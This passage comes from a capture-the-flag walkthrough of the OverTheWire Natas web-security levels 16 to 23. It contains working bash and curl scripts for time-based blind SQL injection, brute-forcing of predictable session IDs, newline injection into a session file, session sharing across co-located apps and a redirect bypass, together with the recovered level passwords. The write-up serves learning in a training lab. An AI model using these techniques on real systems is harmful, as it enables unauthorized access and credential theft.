[+] EqjHJbo7LFNb8vwhHb9 (19/32)
[+] EqjHJbo7LFNb8vwhHb9s (20/32)
[+] EqjHJbo7LFNb8vwhHb9s7 (21/32)
[+] EqjHJbo7LFNb8vwhHb9s75 (22/32)
[+] EqjHJbo7LFNb8vwhHb9s75h (23/32)
[+] EqjHJbo7LFNb8vwhHb9s75ho (24/32)
[+] EqjHJbo7LFNb8vwhHb9s75hok (25/32)
[+] EqjHJbo7LFNb8vwhHb9s75hokh (26/32)
[+] EqjHJbo7LFNb8vwhHb9s75hokh5 (27/32)
[+] EqjHJbo7LFNb8vwhHb9s75hokh5T (28/32)
[+] EqjHJbo7LFNb8vwhHb9s75hokh5TF (29/32)
[+] EqjHJbo7LFNb8vwhHb9s75hokh5TF0 (30/32)
[+] EqjHJbo7LFNb8vwhHb9s75hokh5TF0O (31/32)
[+] EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC (32/32)
[✔] Password: EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
```

And the password for natas17 is `EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC`.

#### The Lesson

Don't rely on blacklisting certain characters for security!
(Command substitution using `$(...)` was still possible.)

### Level 17

- **Date**: 2026-04-01
- **URL**: `http://natas17.natas.labs.overthewire.org`
- **Password**: `EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC`
- **Tools**: Web Browser, `SQL`, `Bash`, `curl`

#### The Solution

Use CTRL + U to view the page source. And notice:

```html
<div id="content">

<form action="index.php" method="POST">
Username: <input name="username"><br>
<input type="submit" value="Check existence" />
</form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
```

Let's check out that source code (URL/index-source.html):

```php
<?php

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas17', '<censored>');
    mysqli_select_db($link, 'natas17');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysqli_query($link, $query);
    if($res) {
    if(mysqli_num_rows($res) > 0) {
        //echo "This user exists.<br>";
    } else {
        //echo "This user doesn't exist.<br>";
    }
    } else {
        //echo "Error in query.<br>";
    }

    mysqli_close($link);
} else {
?>
```

Notice that the output messages have been removed, so we can't rely on blind SQL injection based on response content anymore.

Can we somehow know if the query executed successfully or not?

But what if we use **time**?

In SQL, the `SLEEP()` function can be used to delay execution.

Put `natas18" AND SLEEP(5) --` as the username and submit the form.

- If the page takes 5 seconds to load, it means the query executed successfully and the user exists!
- If the page loads immediately, it means the query did not execute successfully and the user does not exist!

And you will see that the page takes 5 seconds to load, which means the user `natas18` exists!

Now we can use `natas18" AND password LIKE BINARY "a%" AND SLEEP(5) --` to extract the password <u>character by character</u> again, but this time based on **response time** instead of response content!

Let's automate this with a script again!

[level-17\time_based_blind_sql.bash](level-17\time_based_blind_sql.bash)
```bash
#!/bin/bash

[[ -z "$1" ]] && { echo "Usage: $0 <password>"; exit 1; }

URL="http://natas17.natas.labs.overthewire.org/"
AUTH="natas17:$1"

chars='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
password=""

SLEEP_TIME=3
THRESHOLD=2500   # ms

for i in $(seq 1 32); do
  for c in $(echo $chars | fold -w1); do

    attempt="${password}${c}"

    # First measurement
    start=$(date +%s%3N) # Millisecond precision!

    curl -s -u $AUTH \
      --data "username=natas18\" AND IF(password LIKE BINARY \"${attempt}%\", SLEEP(${SLEEP_TIME}), 0) #" \
      "$URL" > /dev/null

    end=$(date +%s%3N) # Millisecond precision!
    elapsed=$((end - start))

    if [[ $elapsed -ge $THRESHOLD ]]; then

      # Confirm (second measurement)
      start=$(date +%s%3N)

      curl -s -u $AUTH \
        --data "username=natas18\" AND IF(password LIKE BINARY \"${attempt}%\", SLEEP(${SLEEP_TIME}), 0) #" \
        "$URL" > /dev/null

      end=$(date +%s%3N)
      elapsed2=$((end - start))

      if [[ $elapsed2 -ge $THRESHOLD ]]; then
        password+=$c
        len=${#password} # Avoid syntax error in echo.
        echo "[+] $password (${len}/32)"
        break
      fi

    fi

  done
done

echo
echo "[✔] Password: $password"
```

Run `bash level-17/time_based_blind_sql.bash EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC` and you will get:
```powershell
[+] 6 (1/32)
[+] 6O (2/32)
[+] 6OG (3/32)
[+] 6OG1 (4/32)
[+] 6OG1P (5/32)
[+] 6OG1Pb (6/32)
[+] 6OG1PbK (7/32)
[+] 6OG1PbKd (8/32)
[+] 6OG1PbKdV (9/32)
[+] 6OG1PbKdVj (10/32)
[+] 6OG1PbKdVjy (11/32)
[+] 6OG1PbKdVjyB (12/32)
[+] 6OG1PbKdVjyBl (13/32)
[+] 6OG1PbKdVjyBlp (14/32)
[+] 6OG1PbKdVjyBlpx (15/32)
[+] 6OG1PbKdVjyBlpxg (16/32)
[+] 6OG1PbKdVjyBlpxgD (17/32)
[+] 6OG1PbKdVjyBlpxgD4 (18/32)
[+] 6OG1PbKdVjyBlpxgD4D (19/32)
[+] 6OG1PbKdVjyBlpxgD4DD (20/32)
[+] 6OG1PbKdVjyBlpxgD4DDb (21/32)
[+] 6OG1PbKdVjyBlpxgD4DDbR (22/32)
[+] 6OG1PbKdVjyBlpxgD4DDbRG (23/32)
[+] 6OG1PbKdVjyBlpxgD4DDbRG6 (24/32)
[+] 6OG1PbKdVjyBlpxgD4DDbRG6Z (25/32)
[+] 6OG1PbKdVjyBlpxgD4DDbRG6ZL (26/32)
[+] 6OG1PbKdVjyBlpxgD4DDbRG6ZLl (27/32)
[+] 6OG1PbKdVjyBlpxgD4DDbRG6ZLlC (28/32)
[+] 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCG (29/32)
[+] 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGg (30/32)
[+] 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgC (31/32)
[+] 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ (32/32)

[✔] Password: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
```

And the password for natas18 is `6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ`.

#### The Lesson

Prevent **SQL injection** from leaking data via timing (`SLEEP(...)`) attacks.

### Level 18

- **Date**: 2026-04-04
- **URL**: `http://natas18.natas.labs.overthewire.org`
- **Password**: `6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ`
- **Tools**: Web Browser, `PHP`, `Bash`, `curl`

#### The Solution

Use CTRL + U to view the page source. And notice:

```html
<div id="content">

<p>
Please login with your admin account to retrieve credentials for natas19.
</p>

<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password"><br>
<input type="submit" value="Login" />
</form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
```

Let's check out that source code (URL/index-source.html):

```php
<?php

$maxid = 640; // 640 should be enough for everyone

function isValidAdminLogin() { /* {{{ */
    if($_REQUEST["username"] == "admin") {
    /* This method of authentication appears to be unsafe and has been disabled for now. */
        //return 1;
    }

    return 0;
}
/* }}} */
function isValidID($id) { /* {{{ */
    return is_numeric($id);
}
/* }}} */
function createID($user) { /* {{{ */
    global $maxid;
    return rand(1, $maxid);
}
/* }}} */
function debug($msg) { /* {{{ */
    if(array_key_exists("debug", $_GET)) {
        print "DEBUG: $msg<br>";
    }
}
/* }}} */
function my_session_start() { /* {{{ */
    if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
    if(!session_start()) {
        debug("Session start failed");
        return false;
    } else {
        debug("Session start ok");
        if(!array_key_exists("admin", $_SESSION)) {
        debug("Session was old: admin flag set");
        $_SESSION["admin"] = 0; // backwards compatible, secure
        }
        return true;
    }
    }

    return false;
}
/* }}} */
function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas19\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";
    }
}
/* }}} */

$showform = true;
if(my_session_start()) {
    print_credentials();
    $showform = false;
} else {
    if(array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) {
    session_id(createID($_REQUEST["username"]));
    session_start();
    $_SESSION["admin"] = isValidAdminLogin();
    debug("New session started");
    $showform = false;
    print_credentials();
    }
}

if($showform) {
?>
```

Notice `rand(1, $maxid)` in `createID()`. This means that there are only 640 possible session IDs!

If `$SESSION["admin"] == 1`, the page will print the password for natas19.

`session_start()` will implicitly call `session_id()` to get the session ID from the `PHPSESSID` cookie, and then load the corresponding session file.

So we can just try all possible session IDs from 1 to 640 and see if any of them have `admin` set to 1!

Let's automate this with a script again!

[level-18\session_bruteforce.bash](level-18\session_bruteforce.bash)
```bash
#!/bin/bash

URL="http://natas18.natas.labs.overthewire.org/"
USER="natas18"
PASS="$1"

if [ -z "$PASS" ]; then
    echo "Usage: $0 <password>"
    exit 1
fi

for i in $(seq 1 640); do
    echo -ne "[*] Testing session $i/640\r"

    RESPONSE=$(curl -s -u "$USER:$PASS" --cookie "PHPSESSID=$i" "$URL")

    if echo "$RESPONSE" | grep -q "You are an admin"; then
        echo
        echo "[+] Found admin session: $i"
        echo "$RESPONSE"
        exit 0
    fi
done

echo
echo "[-] No admin session found"
```

Run `bash level-18/session_bruteforce.bash 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ` and you will get:
```powershell
[*] Testing session 119/640
[+] Found admin session: 119
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas18", "pass": "6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ" };</script></head>
<body>
<h1>natas18</h1>
<div id="content">
You are an admin. The credentials for the next level are:<br><pre>Username: natas19
Password: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr</pre><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

And the password for natas19 is `tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr`.

#### The Lesson

Don't use **predictable session IDs**! (And really do use proper authentication methods instead of this custom one.)

### Level 19

- **Date**: 2026-04-04
- **URL**: `http://natas19.natas.labs.overthewire.org`
- **Password**: `tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr`
- **Tools**: Web Browser, `PHP`, `Bash`, `curl`

#### The Solution

Use CTRL + U to view the page source. And notice:

```html
<div id="content">
<p>
<b>
This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
</b>
</p>

<p>
Please login with your admin account to retrieve credentials for natas20.
</p>

<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password"><br>
<input type="submit" value="Login" />
</form>
</div>
```

There is no source code link, but we can still access the source code at URL/index-source.html:

```php
<?php

$maxid = 640; // 640 should be enough for everyone

function myhex2bin($h) { /* {{{ */
  if (!is_string($h)) return null;
  $r='';
  for ($a=0; $a<strlen($h); $a+=2) { $r.=chr(hexdec($h[$a].$h[($a+1)])); }
  return $r;
}
/* }}} */
function isValidAdminLogin() { /* {{{ */
    if($_REQUEST["username"] == "admin") {
    /* This method of authentication appears to be unsafe and has been disabled for now. */
        //return 1;
    }

    return 0;
}
/* }}} */
function isValidID($id) { /* {{{ */
    // must be lowercase
    if($id != strtolower($id)) {
        return false;
    }

    // must decode
    $decoded = myhex2bin($id);

    // must contain a number and a username
    if(preg_match('/^(?P<id>\d+)-(?P<name>\w+)$/', $decoded, $matches)) {
        return true;
    }

    return false;
}
/* }}} */
function createID($user) { /* {{{ */
    global $maxid;
    $idnum = rand(1, $maxid);
    $idstr = "$idnum-$user";
    return bin2hex($idstr);
}
/* }}} */
function debug($msg) { /* {{{ */
    if(array_key_exists("debug", $_GET)) {
        print "DEBUG: $msg<br>";
    }
}
/* }}} */
function my_session_start() { /* {{{ */
    if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
    if(!session_start()) {
        debug("Session start failed");
        return false;
    } else {
        debug("Session start ok");
        if(!array_key_exists("admin", $_SESSION)) {
        debug("Session was old: admin flag set");
        $_SESSION["admin"] = 0; // backwards compatible, secure
        }
        return true;
    }
    }

    return false;
}
/* }}} */
function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas20\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas20.";
    }
}
/* }}} */

$showform = true;
if(my_session_start()) {
    print_credentials();
    $showform = false;
} else {
    if(array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) {
    session_id(createID($_REQUEST["username"]));
    session_start();
    $_SESSION["admin"] = isValidAdminLogin();
    debug("New session started");
    $showform = false;
    print_credentials();
    }
}

if($showform) {
?>
```

Notice `$idstr = "$idnum-$user";` and `return bin2hex($idstr);` in `createID()`.

So the session ID is now a <u>hex-encoded string</u> of the format `<random number between 1 and 640>-<username>`.

But there are still only 640 possible session IDs!

We can try all possible hex-encoded session IDs and see if any of them have `admin` set to 1.

Let's automate this with a script again!

[level-19\session_hex_bruteforce.bash](level-19\session_hex_bruteforce.bash)
```bash
#!/usr/bin/env bash

USER="natas19"
PASS="$1"
URL="http://natas19.natas.labs.overthewire.org/"

if [ -z "$PASS" ]; then
    echo "Usage: $0 <password>"
    exit 1
fi

FOUND=0

for i in $(seq 1 640); do
    RAW="${i}-admin"
    HEX=$(echo -n "$RAW" | xxd -p)

    printf "\r[*] Trying %s -> %s" "$RAW" "$HEX"

    RES=$(curl -s -u "$USER:$PASS" \
        --cookie "PHPSESSID=$HEX" \
        "$URL")

    echo "$RES" | grep -q "You are an admin" && {
        echo
        echo "[+] FOUND: $RAW -> $HEX"
        echo "$RES"
        FOUND=1
        break
    }
done

[ $FOUND -eq 0 ] && echo
```

Run `bash level-19/session_hex_bruteforce.bash tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr` and you will get:
```powershell
[*] Trying 281-admin -> 3238312d61646d696e
[+] FOUND: 281-admin -> 3238312d61646d696e
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas19", "pass": "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr" };</script></head>
<body>
<h1>natas19</h1>
<div id="content">
<p>
<b>
This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
</b>
</p>
You are an admin. The credentials for the next level are:<br><pre>Username: natas20
Password: p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw</pre></div>
</body>
</html>
```

And the password for natas20 is `p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw`.

#### The Lesson

Don't use **predictable session IDs**! (Even if you hex-encode them, there are still only 640 possible session IDs in this case.)

### Level 20

- **Date**: 2026-04-04
- **URL**: `http://natas20.natas.labs.overthewire.org`
- **Password**: `p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw`
- **Tools**: Web Browser, `curl`

#### The Solution

Use CTRL + U to view the page source. And notice:

```html
<div id="content">
You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.
<form action="index.php" method="POST">
Your name: <input name="name" value=""><br>
<input type="submit" value="Change name" />
</form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
```

Let's check out that source code (URL/index-source.html):

```php
<?php

function debug($msg) { /* {{{ */
    if(array_key_exists("debug", $_GET)) {
        print "DEBUG: $msg<br>";
    }
}
/* }}} */
function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas21\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.";
    }
}
/* }}} */

/* we don't need this */
function myopen($path, $name) {
    //debug("MYOPEN $path $name");
    return true;
}

/* we don't need this */
function myclose() {
    //debug("MYCLOSE");
    return true;
}

function myread($sid) {
    debug("MYREAD $sid");
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID");
        return "";
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    if(!file_exists($filename)) {
        debug("Session file doesn't exist");
        return "";
    }
    debug("Reading from ". $filename);
    $data = file_get_contents($filename);
    $_SESSION = array();
    foreach(explode("\n", $data) as $line) {
        debug("Read [$line]");
    $parts = explode(" ", $line, 2);
    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
    }
    return session_encode() ?: "";
}

function mywrite($sid, $data) {
    // $data contains the serialized version of $_SESSION
    // but our encoding is better
    debug("MYWRITE $sid $data");
    // make sure the sid is alnum only!!
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID");
        return;
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    $data = "";
    debug("Saving in ". $filename);
    ksort($_SESSION);
    foreach($_SESSION as $key => $value) {
        debug("$key => $value");
        $data .= "$key $value\n";
    }
    file_put_contents($filename, $data);
    chmod($filename, 0600);
    return true;
}

/* we don't need this */
function mydestroy($sid) {
    //debug("MYDESTROY $sid");
    return true;
}
/* we don't need this */
function mygarbage($t) {
    //debug("MYGARBAGE $t");
    return true;
}

session_set_save_handler(
    "myopen",
    "myclose",
    "myread",
    "mywrite",
    "mydestroy",
    "mygarbage");
session_start();

if(array_key_exists("name", $_REQUEST)) {
    $_SESSION["name"] = $_REQUEST["name"];
    debug("Name set to " . $_REQUEST["name"]);
}

print_credentials();

$name = "";
if(array_key_exists("name", $_SESSION)) {
    $name = $_SESSION["name"];
}

?>
```

Notice the custom session handler with `myread()` and `mywrite()`.

The session data is stored in a file named `mysess_<sid>`.

Notice `$data .= "$key $value\n";` in `mywrite()`.

This means that the session data is stored in a very simple format of `<key> <value>\n`.

And notice `foreach(explode("\n", $data) as $line)` in `myread()`.

This means that the session data is read line by line and split into key and value by the first space character!

We can only set the `name` key in the session, but we can set its value to something like `foo\nadmin 1`!

Use `curl` to send `name=foo%0Aadmin%201` in the POST data and then check the response.

```powershell
curl.exe -i -c cookies.txt -X POST `
  -d "name=foo`nadmin 1" `
  -u natas20:p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw `
  http://natas20.natas.labs.overthewire.org/
```

This request <u>writes</u> the following to the session file:
```txt
name foo
admin 1
```

Now use `curl` again to read the session file and see if we are an admin:
```powershell
curl.exe -i -b cookies.txt `
  -u natas20:p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw `
  http://natas20.natas.labs.overthewire.org/
```

This request <u>reads</u> the session file and sets `$_SESSION["name"] = "foo"` and `$_SESSION["admin"] = "1"`.

And you will see that the response contains the credentials for natas21:
```powershell
HTTP/1.1 200 OK
Date: Sat, 04 Apr 2026 17:14:35 GMT
Server: Apache/2.4.58 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 1164
Content-Type: text/html; charset=UTF-8

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas20", "pass": "p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw" };</script></head>
<body>
<h1>natas20</h1>
<div id="content">
You are an admin. The credentials for the next level are:<br><pre>Username: natas21
Password: BPhv63cKE1lkQl04cE5CuFTzXe15NfiH</pre>
<form action="index.php" method="POST">
Your name: <input name="name" value="foo"><br>
<input type="submit" value="Change name" />
</form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

And the password for natas21 is `BPhv63cKE1lkQl04cE5CuFTzXe15NfiH`.

#### The Lesson

Don't write your own session handler! (And if you do, use a secure, **non-injectable** format.)

## Levels 21 - 25

### Level 21

- **Date**: 2026-04-05
- **URL**: `http://natas21.natas.labs.overthewire.org`
- **Password**: `BPhv63cKE1lkQl04cE5CuFTzXe15NfiH`
- **Tools**: Web Browser, `curl`

#### The Solution

Use CTRL + U to view the page source. And notice:

```html
<div id="content">
<p>
<b>Note: this website is colocated with <a href="http://natas21-experimenter.natas.labs.overthewire.org">http://natas21-experimenter.natas.labs.overthewire.org</a></b>
</p>

You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
```

Let's check out that source code (URL/index-source.html):

```php
<?php

function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas22\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.";
    }
}
/* }}} */

session_start();
print_credentials();

?>
```

Notice that there is no login mechanism at all!

And notice `this website is colocated with`.

*'Colocated'* means that both `natas21` and `natas21-experimenter` are running on the same server and use the same backend session storage.

So if we can set `admin` to 1 in the session on `natas21-experimenter`, we might be able to access `natas21` and retrieve the credentials for natas22.

We'll first try to set `admin` to 1 on `natas21-experimenter` by sending a request with the following header:
```powershell
curl.exe -u natas21:BPhv63cKE1lkQl04cE5CuFTzXe15NfiH -c cookies.txt "http://natas21-experimenter.natas.labs.overthewire.org/?admin=1&submit=1"
```

Then we'll try to access `natas21` with the same cookie:
```powershell
curl.exe -u natas21:BPhv63cKE1lkQl04cE5CuFTzXe15NfiH -b cookies.txt http://natas21.natas.labs.overthewire.org/
```

**But** we still get `You are logged in as a regular user.`!

Let's check if `admin=1` is actually set for `natas21-experimenter`:
```powershell
curl.exe -u natas21:BPhv63cKE1lkQl04cE5CuFTzXe15NfiH -b cookies.txt "http://natas21-experimenter.natas.labs.overthewire.org/?debug=1"
```

And we do get:
```text
[DEBUG] Session contents:<br>Array
(
    [admin] => 1
    [submit] => 1
    [align] => center
    [fontsize] => 100%
    [bgcolor] => yellow
)
```

So `admin=1` is successfully stored in the session of `natas21-experimenter`, but it is not visible when accessing `natas21`.

This means that, although both applications use the same session storage, they are <u>**not** using the **same session ID**.</u>

PHP sessions are linked to a session ID (`PHPSESSID`), which is stored in a cookie.

When we interact with `natas21-experimenter`, it creates a session and stores `admin=1` in it. But when we then access `natas21`, it does not use that same session. Instead, it creates a new one.

So even though both applications use the same session storage, they are not using the same session.

This explains why our first attempt fails: the `admin=1` value is stored, but in a different session than the one `natas21` is using.

So if we want this to work, we need to make sure both applications use the **exact same session ID**.

First, retrieve a session ID from `natas21-experimenter`:
```powershell
curl.exe -i -u natas21:BPhv63cKE1lkQl04cE5CuFTzXe15NfiH "http://natas21-experimenter.natas.labs.overthewire.org/"
```

From the response, extract the session ID:
```text
Set-Cookie: PHPSESSID=fcrgnlftmi48rc1121sevj9ha4;
```

Now, set `admin=1` in that exact session for `natas21-experimenter`:
```powershell
curl.exe -u natas21:BPhv63cKE1lkQl04cE5CuFTzXe15NfiH -H "Cookie: PHPSESSID=fcrgnlftmi48rc1121sevj9ha4" "http://natas21-experimenter.natas.labs.overthewire.org/?admin=1&submit=1"
```

Finally, use the **same session ID** on `natas21`:
```powershell
curl.exe -u natas21:BPhv63cKE1lkQl04cE5CuFTzXe15NfiH -H "Cookie: PHPSESSID=fcrgnlftmi48rc1121sevj9ha4" "http://natas21.natas.labs.overthewire.org/"
```

Because both applications now use the same session ID, `natas21` now reads the session data set by `natas21-experimenter`, including `admin=1`.

This grants admin access and reveals the credentials for `natas22`.

The response from `natas21` is:
```html
<div id="content">
<p>
<b>Note: this website is colocated with <a href="http://natas21-experimenter.natas.labs.overthewire.org">http://natas21-experimenter.natas.labs.overthewire.org</a></b>
</p>

You are an admin. The credentials for the next level are:<br><pre>Username: natas22
Password: d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz</pre>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
```

And the password for natas22 is `d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz`.

#### The Lesson

**Sharing session storage** across applications is dangerous when session IDs are shared between them.

### Level 22

- **Date**: 2026-04-05
- **URL**: `http://natas22.natas.labs.overthewire.org`
- **Password**: `d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz`
- **Tools**: Web Browser, `curl`

#### The Solution

Use CTRL + U to view the page source. And notice:

```html
<div id="content">


<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
```

Let's check out that source code (URL/index-source.html):

```php
<?php
session_start();

if(array_key_exists("revelio", $_GET)) {
    // only admins can reveal the password
    if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) {
    header("Location: /");
    }
}
?>


<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas22", "pass": "<censored>" };</script></head>
<body>
<h1>natas22</h1>
<div id="content">

<?php
    if(array_key_exists("revelio", $_GET)) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas23\n";
    print "Password: <censored></pre>";
    }
?>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

Notice this bit:
```php
if(array_key_exists("revelio", $_GET)) {
    // only admins can reveal the password
    if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) {
    header("Location: /");
    }
}
```

- If `revelio` is present in the URL query parameters, the page checks if we are an admin.
- If we are not an admin, it redirects us to the homepage.

But notice this too:
```php
if(array_key_exists("revelio", $_GET)) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas23\n";
    print "Password: <censored></pre>";
    }
```

The page prints the password if `revelio` is present in the URL query parameters, <u>without checking if we are an admin!</u>

But because the page immediately redirects non-admins when `revelio` is present, we won't be able to see it.

So we just need to use `?revelio=1` in the URL and <u>prevent the redirection</u> to see the password!

`curl` does **not** follow redirects by default!
```powershell
curl.exe -u natas22:d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz -i http://natas22.natas.labs.overthewire.org/?revelio=1
```

This will show us the credentials for natas23 in the response:
```html
<div id="content">

You are an admin. The credentials for the next level are:<br><pre>Username: natas23
Password: dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs</pre>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
```

And the password for natas23 is `dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs`.

#### The Lesson

Don’t rely on redirection to protect sensitive information — it doesn’t stop the code from running.

### Level 23

- **Date**: 2026-04-05
- **URL**: `http://natas23.natas.labs.overthewire.org`
- **Password**: `dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs`
- **Tools**: Web Browser, `PHP`

#### The Solution

Use CTRL + U to view the page source. And notice:

```html
<div id="content">

Password:
<form name="input" method="get">
    <input type="text" name="passwd" size=20>
    <input type="submit" value="Login">
</form>


<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
```

Let's check out that source code (URL/index-source.html):

```php
<?php
    if(array_key_exists("passwd",$_REQUEST)){
        if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 )){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas24 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
    }
    // morla / 10111
?>
```

- `strstr()` checks if the second argument is a substring of the first.
